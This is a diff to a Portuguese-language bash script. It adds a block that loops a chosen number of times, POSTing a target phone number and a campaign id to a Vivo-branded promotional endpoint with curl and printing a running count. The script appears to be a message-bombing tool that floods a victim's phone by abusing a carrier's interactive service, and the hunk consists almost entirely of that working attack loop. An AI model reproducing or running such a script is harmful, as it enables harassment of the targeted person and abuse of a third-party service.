@@ -106,5 +106,12 @@ data=$"msisdn=$NUMERO&campid=7c732700-bfac-40bf-9805-e5a3ab5d872d&opCode=VV" && 
 echo -e "\033[0m\033[01;32mCONTAGEM:\033[01;37m$i\033[03;037m"
 done
 echo ""
+echo -e "\033[0m\033[01;33mINICIANDO TOKEN 13\033[03;037m"
+for i in $(seq $VEZES);
+do
+data=$"msisdn=$NUMERO&campid=e2b803f3-6992-472d-b4d1-663f5c9c41d7&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl "${site}" -d "${data}"
+echo -e "\033[0m\033[01;32mCONTAGEM:\033[01;37m$i\033[03;037m"
+done
+echo ""
 echo -e "        \033[0m\033[01;37m• \033[01;32mPROGRAMA FINALIZADO \033[01;37m•\033[0m"
 sleep 5
